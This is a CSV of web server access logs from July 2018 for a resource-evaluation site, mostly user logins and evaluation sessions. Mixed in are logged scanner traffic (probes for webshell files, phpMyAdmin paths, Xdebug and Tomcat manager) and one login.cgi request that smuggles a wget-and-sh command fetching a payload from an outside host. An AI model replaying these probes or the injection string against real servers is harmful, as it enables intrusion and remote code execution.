,ip,req,timestamp,marker,resourceID
2308,71.6.63.210,GET /project/1/resources,20/Jul/2018:21:58:41 +0000,,
2309,71.6.63.210,GET /project/1/resources,Fri Jul 20 21:58:41 2018,,
2310,71.6.63.210,GET /project/1/myevaluations/,20/Jul/2018:21:58:47 +0000,,
2311,71.6.63.210,GET /project/1/myevaluations/,Fri Jul 20 21:58:46 2018,,
2312,71.6.63.210,GET /project/1/myevaluations/page/2?,20/Jul/2018:21:58:50 +0000,,
2313,71.6.63.210,GET /project/1/myevaluations/page/2?,Fri Jul 20 21:58:50 2018,,
2314,71.6.63.210,GET /project/1/myevaluations/page/1?,Fri Jul 20 21:58:53 2018,,
2315,71.6.63.210,GET /project/1/myevaluations/page/1?,20/Jul/2018:21:58:53 +0000,,
2316,71.6.63.210,GET /project/1/myevaluations/,20/Jul/2018:21:58:53 +0000,,
2317,71.6.63.210,GET /project/1/myevaluations/,Fri Jul 20 21:58:53 2018,,
2318,71.6.63.210,GET /project/1/resources?,20/Jul/2018:21:58:55 +0000,,
2319,71.6.63.210,GET /project/1/resources?,Fri Jul 20 21:58:55 2018,,
2320,71.6.63.210,GET /newevaluation?resourceid=3223,20/Jul/2018:21:58:58 +0000,evalStart,3223
2321,71.6.63.210,GET /newevaluation?resourceid=3223,Fri Jul 20 21:58:58 2018,evalStart,3223
2322,71.6.63.210,POST /evaluationsubmitted,Fri Jul 20 22:01:29 2018,evalEnd,
2323,71.6.63.210,POST /evaluationsubmitted,20/Jul/2018:22:01:30 +0000,evalEnd,
2324,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:01:30 +0000,,
2325,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:01:30 2018,,
2326,71.6.63.210,GET /newevaluation?resourceid=3602,20/Jul/2018:22:01:35 +0000,evalStart,3602
2327,71.6.63.210,GET /newevaluation?resourceid=3602,Fri Jul 20 22:01:35 2018,evalStart,3602
2328,71.6.63.210,POST /evaluationsubmitted,Fri Jul 20 22:02:48 2018,evalEnd,
2329,71.6.63.210,POST /evaluationsubmitted,20/Jul/2018:22:02:49 +0000,evalEnd,
2330,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:02:49 +0000,,
2331,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:02:49 2018,,
2332,71.6.63.210,GET /newevaluation?resourceid=588,20/Jul/2018:22:02:55 +0000,evalStart,588
2333,71.6.63.210,GET /newevaluation?resourceid=588,Fri Jul 20 22:02:55 2018,evalStart,588
2334,31.184.194.109,GET /,20/Jul/2018:22:03:02 +0000,,
2335,71.6.63.210,POST /evaluationsubmitted,Fri Jul 20 22:03:36 2018,evalEnd,
2336,71.6.63.210,POST /evaluationsubmitted,20/Jul/2018:22:03:37 +0000,evalEnd,
2337,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:03:37 +0000,,
2338,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:03:37 2018,,
2339,71.6.63.210,GET /newevaluation?resourceid=1045,20/Jul/2018:22:03:44 +0000,evalStart,1045
2340,71.6.63.210,GET /newevaluation?resourceid=1045,Fri Jul 20 22:03:44 2018,evalStart,1045
2341,71.6.63.210,POST /evaluationsubmitted,Fri Jul 20 22:08:53 2018,evalEnd,
2342,71.6.63.210,POST /evaluationsubmitted,20/Jul/2018:22:08:53 +0000,evalEnd,
2343,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:08:54 +0000,,
2344,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:08:54 2018,,
2345,71.6.63.210,GET /newevaluation?resourceid=3314,20/Jul/2018:22:09:20 +0000,evalStart,3314
2346,71.6.63.210,GET /newevaluation?resourceid=3314,Fri Jul 20 22:09:19 2018,evalStart,3314
2347,71.6.63.210,POST /evaluationsubmitted,Fri Jul 20 22:10:07 2018,evalEnd,
2348,71.6.63.210,POST /evaluationsubmitted,20/Jul/2018:22:10:08 +0000,evalEnd,
2349,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:10:08 +0000,,
2350,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:10:08 2018,,
2351,71.6.63.210,GET /newevaluation?resourceid=3041,20/Jul/2018:22:10:18 +0000,evalStart,3041
2352,71.6.63.210,GET /newevaluation?resourceid=3041,Fri Jul 20 22:10:18 2018,evalStart,3041
2353,70.42.131.170,GET /newevaluation%3fresourceid=1482,20/Jul/2018:22:15:04 +0000,evalStart,1482
2354,70.42.131.170,GET /newevaluation?resourceid=1482,Fri Jul 20 22:15:05 2018,evalStart,1482
2355,70.42.131.170,GET /newevaluation?resourceid=1482,20/Jul/2018:22:15:05 +0000,evalStart,1482
2356,70.42.131.170,GET /login?next=%2Fnewevaluation%3Fresourceid%3D1482,Fri Jul 20 22:15:05 2018,,
2357,70.42.131.170,GET /login?next=%2Fnewevaluation%3Fresourceid%3D1482,20/Jul/2018:22:15:05 +0000,,
2358,70.42.131.170,GET /static/img/icon-32.png,20/Jul/2018:22:15:05 +0000,,
2359,71.6.63.210,POST /evaluationsubmitted,Fri Jul 20 22:15:38 2018,evalEnd,
2360,71.6.63.210,POST /evaluationsubmitted,20/Jul/2018:22:15:39 +0000,evalEnd,
2361,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:15:39 +0000,,
2362,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:15:39 2018,,
2363,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:15:47 +0000,,
2364,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:15:47 2018,,
2365,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:15:49 +0000,,
2366,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:15:49 2018,,
2367,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:15:52 +0000,,
2368,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:15:52 2018,,
2369,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:15:54 +0000,,
2370,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:15:54 2018,,
2371,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:15:57 +0000,,
2372,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:15:56 2018,,
2373,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:15:59 +0000,,
2374,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:15:58 2018,,
2375,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:16:01 +0000,,
2376,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:16:00 2018,,
2377,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:16:02 +0000,,
2378,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:16:02 2018,,
2379,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:16:04 +0000,,
2380,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:16:04 2018,,
2381,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:16:06 +0000,,
2382,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:16:06 2018,,
2383,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:16:08 +0000,,
2384,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:16:08 2018,,
2385,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:16:10 +0000,,
2386,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:16:09 2018,,
2387,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:16:15 +0000,,
2388,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:16:15 2018,,
2389,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:16:17 +0000,,
2390,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:16:17 2018,,
2391,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:16:20 +0000,,
2392,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:16:20 2018,,
2393,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:18:44 +0000,,
2394,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:18:44 2018,,
2395,71.6.63.210,GET /project/1/resources,20/Jul/2018:22:18:53 +0000,,
2396,71.6.63.210,GET /project/1/resources,Fri Jul 20 22:18:53 2018,,
2397,70.42.131.170,GET /,20/Jul/2018:22:30:24 +0000,,
2398,70.42.131.170,GET /,Fri Jul 20 22:30:25 2018,,
2399,70.42.131.170,GET /,20/Jul/2018:22:30:25 +0000,,
2400,70.42.131.170,GET /static/img/icon-32.png,20/Jul/2018:22:30:25 +0000,,
2401,117.50.7.159,GET /,20/Jul/2018:22:30:46 +0000,,
2402,106.75.106.221,GET /,20/Jul/2018:22:30:47 +0000,,
2403,106.75.106.221,GET /,Fri Jul 20 22:30:48 2018,,
2404,106.75.106.221,GET /,20/Jul/2018:22:30:48 +0000,,
2405,80.44.121.225,GET /,20/Jul/2018:22:46:51 +0000,,
2406,70.42.131.170,GET /project/1/myevaluations/page/2%3f,20/Jul/2018:23:06:56 +0000,,
2407,70.42.131.170,GET /project/1/myevaluations/page/2?,Fri Jul 20 23:06:57 2018,,
2408,70.42.131.170,GET /project/1/myevaluations/page/2?,20/Jul/2018:23:06:57 +0000,,
2409,70.42.131.170,GET /login?next=%2Fproject%2F1%2Fmyevaluations%2Fpage%2F2,Fri Jul 20 23:06:57 2018,,
2410,70.42.131.170,GET /login?next=%2Fproject%2F1%2Fmyevaluations%2Fpage%2F2,20/Jul/2018:23:06:57 +0000,,
2411,70.42.131.170,GET /static/img/icon-32.png,20/Jul/2018:23:06:57 +0000,,
2412,70.42.131.170,GET /newevaluation%3fresourceid=2274,20/Jul/2018:23:26:12 +0000,evalStart,2274
2413,70.42.131.170,GET /newevaluation?resourceid=2274,Fri Jul 20 23:26:12 2018,evalStart,2274
2414,70.42.131.170,GET /newevaluation?resourceid=2274,20/Jul/2018:23:26:12 +0000,evalStart,2274
2415,70.42.131.170,GET /login?next=%2Fnewevaluation%3Fresourceid%3D2274,Fri Jul 20 23:26:13 2018,,
2416,70.42.131.170,GET /login?next=%2Fnewevaluation%3Fresourceid%3D2274,20/Jul/2018:23:26:13 +0000,,
2417,70.42.131.170,GET /static/img/icon-32.png,20/Jul/2018:23:26:13 +0000,,
2418,82.76.222.175,GET /,20/Jul/2018:23:52:50 +0000,,
2419,70.42.131.170,GET /favicon.ico,20/Jul/2018:23:55:03 +0000,,
2420,70.42.131.170,GET /favicon.ico,Fri Jul 20 23:55:03 2018,,
2421,70.42.131.170,GET /favicon.ico,20/Jul/2018:23:55:03 +0000,,
2422,37.49.231.62,GET //libs/js/iframe.js,Sat Jul 21 00:25:12 2018,,
2423,37.49.231.62,GET //libs/js/iframe.js,21/Jul/2018:00:25:12 +0000,,
2424,178.219.173.252,GET /,21/Jul/2018:00:33:40 +0000,,
2425,178.219.173.252,GET /,21/Jul/2018:00:33:40 +0000,,
2426,18.232.118.81,GET /robots.txt,Sat Jul 21 01:06:17 2018,,
2427,18.232.118.81,GET /robots.txt,21/Jul/2018:01:06:17 +0000,,
2428,18.232.118.81,GET /,Sat Jul 21 01:06:17 2018,,
2429,18.232.118.81,GET /,21/Jul/2018:01:06:17 +0000,,
2430,71.77.224.77,GET /,21/Jul/2018:01:31:25 +0000,,
2431,150.109.101.136,GET /webdav/,21/Jul/2018:01:37:15 +0000,,
2432,150.109.101.136,POST /wuwu11.php,21/Jul/2018:01:37:16 +0000,,
2433,150.109.101.136,POST /xw.php,21/Jul/2018:01:37:16 +0000,,
2434,150.109.101.136,POST /xw1.php,21/Jul/2018:01:37:17 +0000,,
2435,150.109.101.136,POST /9678.php,21/Jul/2018:01:37:17 +0000,,
2436,150.109.101.136,POST /wc.php,21/Jul/2018:01:37:18 +0000,,
2437,150.109.101.136,POST /xx.php,21/Jul/2018:01:37:18 +0000,,
2438,150.109.101.136,POST /s.php,21/Jul/2018:01:37:18 +0000,,
2439,150.109.101.136,POST /w.php,21/Jul/2018:01:37:19 +0000,,
2440,150.109.101.136,POST /sheep.php,21/Jul/2018:01:37:19 +0000,,
2441,150.109.101.136,POST /db.init.php,21/Jul/2018:01:37:20 +0000,,
2442,150.109.101.136,POST /db_session.init.php,21/Jul/2018:01:37:20 +0000,,
2443,150.109.101.136,POST /db__.init.php,21/Jul/2018:01:37:21 +0000,,
2444,150.109.101.136,POST /mx.php,21/Jul/2018:01:37:21 +0000,,
2445,150.109.101.136,POST /wshell.php,21/Jul/2018:01:37:22 +0000,,
2446,150.109.101.136,POST /xshell.php,21/Jul/2018:01:37:22 +0000,,
2447,150.109.101.136,POST /qq.php,21/Jul/2018:01:37:23 +0000,,
2448,150.109.101.136,POST /conflg.php,21/Jul/2018:01:37:23 +0000,,
2449,150.109.101.136,POST /lindex.php,21/Jul/2018:01:37:23 +0000,,
2450,150.109.101.136,POST /phpstudy.php,21/Jul/2018:01:37:24 +0000,,
2451,150.109.101.136,POST /weixiao.php,21/Jul/2018:01:37:27 +0000,,
2452,150.109.101.136,POST /feixiang.php,21/Jul/2018:01:37:28 +0000,,
2453,150.109.101.136,POST /ak47.php,21/Jul/2018:01:37:28 +0000,,
2454,150.109.101.136,POST /xiao.php,21/Jul/2018:01:37:28 +0000,,
2455,150.109.101.136,POST /yao.php,21/Jul/2018:01:37:29 +0000,,
2456,150.109.101.136,POST /defect.php,21/Jul/2018:01:37:29 +0000,,
2457,150.109.101.136,POST /webslee.php,21/Jul/2018:01:37:30 +0000,,
2458,150.109.101.136,POST /q.php,21/Jul/2018:01:37:30 +0000,,
2459,150.109.101.136,POST /pe.php,21/Jul/2018:01:37:31 +0000,,
2460,150.109.101.136,POST /hm.php,21/Jul/2018:01:37:31 +0000,,
2461,150.109.101.136,POST /xiaoma.php,21/Jul/2018:01:37:32 +0000,,
2462,150.109.101.136,POST /qq.php,21/Jul/2018:01:37:32 +0000,,
2463,150.109.101.136,POST /data.php,21/Jul/2018:01:37:33 +0000,,
2464,150.109.101.136,POST /log.php,21/Jul/2018:01:37:34 +0000,,
2465,150.109.101.136,POST /fack.php,21/Jul/2018:01:37:34 +0000,,
2466,150.109.101.136,POST /angge.php,21/Jul/2018:01:37:34 +0000,,
2467,150.109.101.136,GET /index.php,21/Jul/2018:01:37:36 +0000,,
2468,150.109.101.136,GET /phpmyadmin/index.php,21/Jul/2018:01:37:36 +0000,,
2469,150.109.101.136,GET /phpMyAdmin/index.php,21/Jul/2018:01:37:37 +0000,,
2470,150.109.101.136,GET /pmd/index.php,21/Jul/2018:01:37:38 +0000,,
2471,150.109.101.136,GET /pma/index.php,21/Jul/2018:01:37:40 +0000,,
2472,150.109.101.136,GET /PMA/index.php,21/Jul/2018:01:37:40 +0000,,
2473,150.109.101.136,GET /PMA2/index.php,21/Jul/2018:01:37:41 +0000,,
2474,150.109.101.136,GET /pmamy/index.php,21/Jul/2018:01:37:41 +0000,,
2475,150.109.101.136,GET /pmamy2/index.php,21/Jul/2018:01:37:41 +0000,,
2476,150.109.101.136,GET /mysql/index.php,21/Jul/2018:01:37:41 +0000,,
2477,150.109.101.136,GET /admin/index.php,21/Jul/2018:01:37:42 +0000,,
2478,150.109.101.136,GET /db/index.php,21/Jul/2018:01:37:42 +0000,,
2479,150.109.101.136,GET /dbadmin/index.php,21/Jul/2018:01:37:43 +0000,,
2480,150.109.101.136,GET /web/phpMyAdmin/index.php,21/Jul/2018:01:37:44 +0000,,
2481,150.109.101.136,GET /admin/pma/index.php,21/Jul/2018:01:37:44 +0000,,
2482,150.109.101.136,GET /admin/PMA/index.php,21/Jul/2018:01:37:45 +0000,,
2483,150.109.101.136,GET /admin/mysql/index.php,21/Jul/2018:01:37:45 +0000,,
2484,150.109.101.136,GET /admin/mysql2/index.php,21/Jul/2018:01:37:45 +0000,,
2485,150.109.101.136,GET /admin/phpmyadmin/index.php,21/Jul/2018:01:37:45 +0000,,
2486,150.109.101.136,GET /admin/phpMyAdmin/index.php,21/Jul/2018:01:37:46 +0000,,
2487,150.109.101.136,GET /admin/phpmyadmin2/index.php,21/Jul/2018:01:37:46 +0000,,
2488,150.109.101.136,GET /mysqladmin/index.php,21/Jul/2018:01:37:46 +0000,,
2489,150.109.101.136,GET /mysql-admin/index.php,21/Jul/2018:01:37:46 +0000,,
2490,150.109.101.136,GET /phpadmin/index.php,21/Jul/2018:01:37:46 +0000,,
2491,150.109.101.136,GET /phpmyadmin0/index.php,21/Jul/2018:01:37:48 +0000,,
2492,150.109.101.136,GET /phpmyadmin1/index.php,21/Jul/2018:01:37:48 +0000,,
2493,150.109.101.136,GET /phpmyadmin2/index.php,21/Jul/2018:01:37:48 +0000,,
2494,150.109.101.136,GET /myadmin/index.php,21/Jul/2018:01:37:49 +0000,,
2495,150.109.101.136,GET /myadmin2/index.php,21/Jul/2018:01:37:49 +0000,,
2496,150.109.101.136,GET /xampp/phpmyadmin/index.php,21/Jul/2018:01:37:49 +0000,,
2497,150.109.101.136,GET /phpMyadmin_bak/index.php,21/Jul/2018:01:37:49 +0000,,
2498,150.109.101.136,GET /www/phpMyAdmin/index.php,21/Jul/2018:01:37:50 +0000,,
2499,150.109.101.136,GET /tools/phpMyAdmin/index.php,21/Jul/2018:01:37:50 +0000,,
2500,150.109.101.136,GET /phpmyadmin-old/index.php,21/Jul/2018:01:37:50 +0000,,
2501,150.109.101.136,GET /phpMyAdminold/index.php,21/Jul/2018:01:37:50 +0000,,
2502,150.109.101.136,GET /phpMyAdmin.old/index.php,21/Jul/2018:01:37:50 +0000,,
2503,150.109.101.136,GET /pma-old/index.php,21/Jul/2018:01:37:51 +0000,,
2504,150.109.101.136,GET /claroline/phpMyAdmin/index.php,21/Jul/2018:01:37:51 +0000,,
2505,150.109.101.136,GET /typo3/phpmyadmin/index.php,21/Jul/2018:01:37:51 +0000,,
2506,150.109.101.136,GET /phpma/index.php,21/Jul/2018:01:37:51 +0000,,
2507,150.109.101.136,GET /phpmyadmin/phpmyadmin/index.php,21/Jul/2018:01:37:52 +0000,,
2508,150.109.101.136,GET /phpMyAdmin/phpMyAdmin/index.php,21/Jul/2018:01:37:52 +0000,,
2509,182.160.103.174,GET /,21/Jul/2018:03:19:39 +0000,,
2510,167.58.163.229,GET /,21/Jul/2018:03:23:53 +0000,,
2511,86.60.205.75,GET /,21/Jul/2018:03:24:31 +0000,,
2512,189.251.99.194,GET /,21/Jul/2018:03:43:55 +0000,,
2513,81.82.223.202,GET /,21/Jul/2018:03:56:54 +0000,,
2514,87.227.238.188,GET /,21/Jul/2018:04:04:30 +0000,,
2515,216.10.133.143,GET /,21/Jul/2018:04:29:48 +0000,,
2516,110.76.148.197,GET /,21/Jul/2018:05:08:34 +0000,,
2517,31.184.194.109,GET /,21/Jul/2018:06:47:54 +0000,,
2518,123.7.183.80,GET /w00tw00t.at.blackhats.romanian.anti-sec:),21/Jul/2018:06:50:04 +0000,,
2519,123.7.183.80,GET /phpMyAdmin/scripts/setup.php,21/Jul/2018:06:50:04 +0000,,
2520,123.7.183.80,GET /MyAdmin/scripts/setup.php,21/Jul/2018:06:50:04 +0000,,
2521,123.7.183.80,GET /pma/scripts/setup.php,21/Jul/2018:06:50:04 +0000,,
2522,123.7.183.80,GET /phpmyadmin/scripts/setup.php,21/Jul/2018:06:50:04 +0000,,
2523,123.7.183.80,GET /myadmin/scripts/setup.php,21/Jul/2018:06:50:04 +0000,,
2524,122.228.10.51,GET /,21/Jul/2018:06:52:53 +0000,,
2525,122.228.10.51,GET /,Sat Jul 21 06:52:56 2018,,
2526,122.228.10.51,GET /,21/Jul/2018:06:52:56 +0000,,
2527,122.228.10.51,GET /,Sat Jul 21 07:06:17 2018,,
2528,122.228.10.51,GET /,21/Jul/2018:07:06:17 +0000,,
2529,103.73.182.136,GET /,21/Jul/2018:07:38:19 +0000,,
2530,77.159.88.126,GET /,21/Jul/2018:08:08:07 +0000,,
2531,77.159.88.126,GET /,21/Jul/2018:08:08:07 +0000,,
2532,91.242.44.19,GET /,21/Jul/2018:08:13:06 +0000,,
2533,218.205.52.12,GET /manager/html,21/Jul/2018:08:17:00 +0000,,
2534,109.94.245.33,GET /,21/Jul/2018:10:50:43 +0000,,
2535,31.217.209.55,GET /,21/Jul/2018:11:01:29 +0000,,
2536,31.184.194.109,GET /,21/Jul/2018:11:48:07 +0000,,
2537,41.193.77.105,GET /,21/Jul/2018:12:23:07 +0000,,
2538,186.159.1.217,GET /,21/Jul/2018:12:41:19 +0000,,
2539,43.245.218.54,GET /,21/Jul/2018:13:10:55 +0000,,
2540,172.104.108.109,GET /,21/Jul/2018:13:42:25 +0000,,
2541,74.82.47.5,GET /,Sat Jul 21 13:45:50 2018,,
2542,74.82.47.5,GET /,21/Jul/2018:13:45:50 +0000,,
2543,92.38.45.74,GET /,21/Jul/2018:13:52:31 +0000,,
2544,5.8.54.27,GET /?XDEBUG_SESSION_START=phpstorm,21/Jul/2018:14:48:23 +0000,,
2545,5.8.54.27,GET /?XDEBUG_SESSION_START=phpstorm,Sat Jul 21 14:48:24 2018,,
2546,5.8.54.27,GET /?XDEBUG_SESSION_START=phpstorm,21/Jul/2018:14:48:24 +0000,,
2547,159.224.194.90,GET /,21/Jul/2018:14:51:56 +0000,,
2548,181.119.119.202,GET /,21/Jul/2018:15:13:55 +0000,,
2549,46.237.79.209,GET /,21/Jul/2018:15:15:43 +0000,,
2550,116.76.90.112,GET /,21/Jul/2018:17:00:20 +0000,,
2551,41.235.241.224,GET /login.cgi?cli=aa%20aa%27;wget%20http://g.mariokartayy.com/x%20-O%20-%3E%20/tmp/x;sh%20/tmp/x%27$,21/Jul/2018:17:40:09 +0000,,
2552,67.247.104.81,GET /,21/Jul/2018:17:40:42 +0000,,
2553,67.247.104.81,GET /,Sat Jul 21 17:40:43 2018,,
2554,67.247.104.81,GET /,21/Jul/2018:17:40:43 +0000,,
2555,67.247.104.81,GET /static/img/icon-32.png,21/Jul/2018:17:40:43 +0000,,
2556,67.247.104.81,GET /static/img/favicon.ico,21/Jul/2018:17:40:44 +0000,,
2557,67.247.104.81,GET /login,Sat Jul 21 17:40:46 2018,,
2558,67.247.104.81,GET /login,21/Jul/2018:17:40:46 +0000,,
2559,67.247.104.81,POST /login,Sat Jul 21 17:40:58 2018,,
2560,67.247.104.81,POST /login,21/Jul/2018:17:41:00 +0000,,
2561,67.247.104.81,GET /login,Sat Jul 21 17:41:00 2018,,
2562,67.247.104.81,GET /login,21/Jul/2018:17:41:00 +0000,,
2563,67.247.104.81,POST /login,Sat Jul 21 17:41:05 2018,,
2564,67.247.104.81,POST /login,21/Jul/2018:17:41:05 +0000,,
2565,67.247.104.81,GET /login,Sat Jul 21 17:41:05 2018,,
2566,67.247.104.81,GET /login,21/Jul/2018:17:41:05 +0000,,
2567,67.247.104.81,POST /login,Sat Jul 21 17:41:14 2018,,
2568,67.247.104.81,POST /login,21/Jul/2018:17:41:14 +0000,,
2569,67.247.104.81,GET /login,Sat Jul 21 17:41:14 2018,,
2570,67.247.104.81,GET /login,21/Jul/2018:17:41:14 +0000,,
2571,67.247.104.81,GET /forgotpassword,Sat Jul 21 17:41:30 2018,,
2572,67.247.104.81,GET /forgotpassword,21/Jul/2018:17:41:30 +0000,,
2573,67.247.104.81,POST /sentpassword,Sat Jul 21 17:41:33 2018,,
2574,67.247.104.81,POST /sentpassword,21/Jul/2018:17:41:34 +0000,,
2575,67.247.104.81,GET /favicon.ico,Sat Jul 21 17:41:34 2018,,
2576,67.247.104.81,GET /favicon.ico,21/Jul/2018:17:41:34 +0000,,
2577,67.247.104.81,GET /,21/Jul/2018:17:41:41 +0000,,
2578,67.247.104.81,GET /,Sat Jul 21 17:41:41 2018,,
2579,67.247.104.81,GET /login,Sat Jul 21 17:42:55 2018,,
2580,67.247.104.81,GET /login,21/Jul/2018:17:42:55 +0000,,
2581,67.247.104.81,POST /login,Sat Jul 21 17:43:04 2018,,
2582,67.247.104.81,POST /login,21/Jul/2018:17:43:04 +0000,,
2583,67.247.104.81,GET /login,Sat Jul 21 17:43:04 2018,,
2584,67.247.104.81,GET /login,21/Jul/2018:17:43:04 +0000,,
2585,67.247.104.81,POST /login,Sat Jul 21 17:43:18 2018,,
2586,67.247.104.81,POST /login,21/Jul/2018:17:43:19 +0000,,
2587,67.247.104.81,GET /login,Sat Jul 21 17:43:19 2018,,
2588,67.247.104.81,GET /login,21/Jul/2018:17:43:19 +0000,,
2589,67.247.104.81,GET /register,Sat Jul 21 17:43:21 2018,,
2590,67.247.104.81,GET /register,21/Jul/2018:17:43:21 +0000,,
2591,67.247.104.81,POST /register,Sat Jul 21 17:44:06 2018,,
2592,67.247.104.81,POST /register,21/Jul/2018:17:44:06 +0000,,
2593,67.247.104.81,GET /register,Sat Jul 21 17:44:06 2018,,
2594,67.247.104.81,GET /register,21/Jul/2018:17:44:06 +0000,,
2595,67.247.104.81,POST /register,Sat Jul 21 17:44:55 2018,,
2596,67.247.104.81,POST /register,21/Jul/2018:17:44:55 +0000,,
2597,67.247.104.81,GET /login,Sat Jul 21 17:44:55 2018,,
2598,67.247.104.81,GET /login,21/Jul/2018:17:44:55 +0000,,
2599,67.247.104.81,POST /login,Sat Jul 21 17:44:59 2018,,
2600,67.247.104.81,POST /login,21/Jul/2018:17:44:59 +0000,,
2601,67.247.104.81,GET /,21/Jul/2018:17:44:59 +0000,,
2602,67.247.104.81,GET /,Sat Jul 21 17:44:59 2018,,
2603,67.247.104.81,GET /project/1/resources,21/Jul/2018:17:45:05 +0000,,
2604,67.247.104.81,GET /project/1/resources,Sat Jul 21 17:45:05 2018,,
2605,67.247.104.81,GET /newevaluation?resourceid=983,21/Jul/2018:17:46:09 +0000,evalStart,983
2606,67.247.104.81,GET /newevaluation?resourceid=983,Sat Jul 21 17:46:09 2018,evalStart,983
2607,67.247.104.81,POST /evaluationsubmitted,Sat Jul 21 17:53:00 2018,evalEnd,
2608,67.247.104.81,POST /evaluationsubmitted,21/Jul/2018:17:53:01 +0000,evalEnd,
2609,67.247.104.81,GET /project/1/resources,21/Jul/2018:17:53:01 +0000,,
2610,67.247.104.81,GET /project/1/resources,Sat Jul 21 17:53:01 2018,,
2611,67.247.104.81,GET /project/1/myevaluations?,Sat Jul 21 17:53:04 2018,,
2612,67.247.104.81,GET /project/1/myevaluations?,21/Jul/2018:17:53:04 +0000,,
2613,67.247.104.81,GET /project/1/myevaluations/,21/Jul/2018:17:53:04 +0000,,
2614,67.247.104.81,GET /project/1/myevaluations/,Sat Jul 21 17:53:04 2018,,
2615,67.247.104.81,GET /project/1/resources?,21/Jul/2018:17:53:06 +0000,,
2616,67.247.104.81,GET /project/1/resources?,Sat Jul 21 17:53:06 2018,,
2617,67.247.104.81,GET /newevaluation?resourceid=3019,21/Jul/2018:17:53:14 +0000,evalStart,3019
2618,67.247.104.81,GET /newevaluation?resourceid=3019,Sat Jul 21 17:53:14 2018,evalStart,3019
2619,67.247.104.81,POST /evaluationsubmitted,Sat Jul 21 17:55:37 2018,evalEnd,
2620,67.247.104.81,POST /evaluationsubmitted,21/Jul/2018:17:55:38 +0000,evalEnd,
2621,67.247.104.81,GET /project/1/resources,21/Jul/2018:17:55:38 +0000,,
2622,67.247.104.81,GET /project/1/resources,Sat Jul 21 17:55:38 2018,,
2623,67.247.104.81,GET /newevaluation?resourceid=771,21/Jul/2018:17:55:45 +0000,evalStart,771
2624,67.247.104.81,GET /newevaluation?resourceid=771,Sat Jul 21 17:55:45 2018,evalStart,771
2625,5.79.90.39,GET /,21/Jul/2018:17:57:10 +0000,,
2626,5.79.90.39,GET /,Sat Jul 21 17:57:12 2018,,
2627,5.79.90.39,GET /,21/Jul/2018:17:57:12 +0000,,
2628,67.247.104.81,POST /evaluationsubmitted,Sat Jul 21 18:01:52 2018,evalEnd,
2629,67.247.104.81,POST /evaluationsubmitted,21/Jul/2018:18:01:53 +0000,evalEnd,
